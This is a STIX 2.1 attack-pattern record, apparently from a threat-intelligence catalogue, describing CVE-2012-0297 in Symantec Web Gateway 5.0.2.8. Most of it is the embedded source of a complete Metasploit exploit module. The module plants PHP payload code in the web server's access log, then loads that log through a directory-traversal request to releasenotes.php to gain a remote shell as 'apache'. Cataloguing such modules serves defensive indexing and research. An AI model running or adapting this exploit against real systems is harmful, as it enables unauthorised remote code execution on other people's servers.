{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ba53b412-07ae-437a-9d6c-ed093a0d0eec",
    "created": "2024-08-14T17:01:20.157007Z",
    "modified": "2024-08-14T17:01:20.157011Z",
    "name": "\"Symantec Web Gateway 5.0.2.8 relfile File Inclusion Vulnerability\"",
    "description": " This module exploits a vulnerability found in Symantec Web Gateway's HTTP service.  By injecting PHP code in the access log, it is possible to load it with a directory traversal flaw, which allows remote code execution under the context of 'apache'. Please note that it may take up to several minutes to retrieve access_log, which is about the amount of time required to see a shell back.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/symantec_web_gateway_lfi.rb",
            "external_id": "symantec_web_gateway_lfi.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0297"
        },
        {
            "source_name": "reference",
            "url": "http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120517_00"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Symantec Web Gateway 5.0.2.8 relfile File Inclusion Vulnerability\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in Symantec Web Gateway's HTTP\n        service.  By injecting PHP code in the access log, it is possible to load it\n        with a directory traversal flaw, which allows remote code execution under the\n        context of 'apache'. Please note that it may take up to several minutes to\n        retrieve access_log, which is about the amount of time required to see a shell\n        back.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Unknown', #Discovery\n          'muts',    #PoC\n          'sinn3r'   #Metasploit\n        ],\n      'References'     =>\n        [\n          ['CVE', '2012-0297'],\n          ['OSVDB', '82023'],\n          ['EDB', '18932'],\n          ['URL', 'http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120517_00']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\"\n        },\n      'DefaultOptions'  =>\n        {\n          'WfsDelay' => 300,  #5 minutes\n          'DisablePayloadHandler' => false,\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          ['Symantec Web Gateway 5.0.2.8', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-05-17',\n      'DefaultTarget'  => 0))\n  end\n\n\n  def check\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri'    => '/spywall/login.php'\n    })\n\n    if res and res.body =~ /\\<title\\>Symantec Web Gateway\\<\\/title\\>/\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n\n  def exploit\n    if check == Exploit::CheckCode::Safe\n      print_status(\"#{rhost}:#{rport} doesn't look like Symantec Web Gateway, will not engage.\")\n      return\n    end\n\n    peer = \"#{rhost}:#{rport}\"\n\n    php = %Q|<?php #{payload.encoded} ?>|\n\n    # Inject PHP to log\n    print_status(\"Injecting PHP to log...\")\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri'    => \"/#{php}\"\n    })\n\n    select(nil, nil, nil, 1)\n\n    # Use the directory traversal to load the PHP code\n    # access_log takes a long time to retrieve\n    print_status(\"Loading PHP code..\")\n    send_request_raw({\n      'method' => 'GET',\n      'uri'    => '/spywall/releasenotes.php?relfile=../../../../../usr/local/apache2/logs/access_log'\n    })\n\n    print_status(\"Waiting for a session, may take some time...\")\n\n    select(nil, nil, nil, 1)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-05-17",
    "x_mitre_platforms": [
        "['php']"
    ]
}